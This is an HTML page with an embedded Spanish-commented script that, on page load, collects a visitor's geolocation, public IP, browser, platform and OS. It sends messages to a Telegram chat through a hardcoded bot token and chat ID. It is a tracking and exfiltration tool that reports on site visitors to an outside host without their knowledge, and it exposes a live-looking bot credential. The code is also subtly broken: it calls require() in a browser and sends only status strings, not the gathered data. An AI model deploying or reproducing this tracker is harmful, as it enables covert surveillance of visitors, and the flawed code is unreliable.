<!DOCTYPE html>
<html>
<head>
  <title>Obtener Datos y Enviar a Telegram</title>
</head>
<body>
  <h1>Obtener Datos y Enviar a Telegram</h1>

  <script>
    // Importar la biblioteca axios en tu entorno de ejecución
    const axios = require('axios');

    // Objeto para almacenar los datos del usuario
    var userData = {};

    // Función para enviar datos a Telegram
    function sendToTelegram(message) {
      // Verificar si el mensaje está vacío
      if (!message) {
        console.error('Error al enviar el mensaje a Telegram: El texto del mensaje está vacío');
        return;
      }

      const botToken = '1597773806:AAFh0xrEMv7pmSuDF84XGc5MA5C7SMdiKZw'; // Agrega aquí el token de tu bot de Telegram
      const chatId = '1116794830'; // Agrega aquí el ID de tu chat de Telegram

      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
      const data = {
        chat_id: chatId,
        text: message
      };

      axios.post(telegramUrl, data)
        .then(response => {
          console.log('Mensaje enviado a Telegram:', response.data);
        })
        .catch(error => {
          console.error('Error al enviar el mensaje a Telegram:', error);
        });
    }

    // Obtener datos de ubicación, IP, dispositivo, navegador y sistema operativo
    function getData() {
      // Obtener la ubicación
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          var latitude = position.coords.latitude;
          var longitude = position.coords.longitude;
          userData.location = latitude + ',' + longitude;
          console.log('Ubicación:', userData.location);

          // Obtener la IP
          fetch('https://api.ipify.org/?format=json')
            .then(response => response.json())
            .then(data => {
              userData.ip = data.ip;
              console.log('IP:', userData.ip);

              // Obtener información del dispositivo, navegador y sistema operativo
              var userAgent = navigator.userAgent;
              userData.device = navigator.platform;
              userData.browser = userAgent.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i)[1];
              userData.os = navigator.oscpu || navigator.platform;
              console.log('Dispositivo:', userData.device);
              console.log('Navegador:', userData.browser);
              console.log('Sistema Operativo:', userData.os);

              // Obtener el identificador de dispositivo
              var deviceIdentifier = localStorage.getItem('deviceIdentifier');
              var isFirstTime = localStorage.getItem('isFirstTime') === null;

              if (isFirstTime) {
                localStorage.setItem('isFirstTime', 'false');
                userData.deviceIdentifier = deviceIdentifier; // Corrección: asignar el identificador de dispositivo
                console.log('Es el primer inicio del dispositivo');
                sendToTelegram('Es el primer inicio del dispositivo');
              } else if (deviceIdentifier === userData.device) {
                console.log('Los datos del dispositivo son iguales');
                sendToTelegram('Los datos del dispositivo son iguales');
              } else {
                console.log('Los datos del dispositivo han cambiado');
                sendToTelegram('Los datos del dispositivo han cambiado');
              }
            })
            .catch(error => console.error('Error al obtener los datos:', error));
        });
      }
    }

    // Llamar a la función para obtener los datos
    getData();
  </script>
</body>
</html>
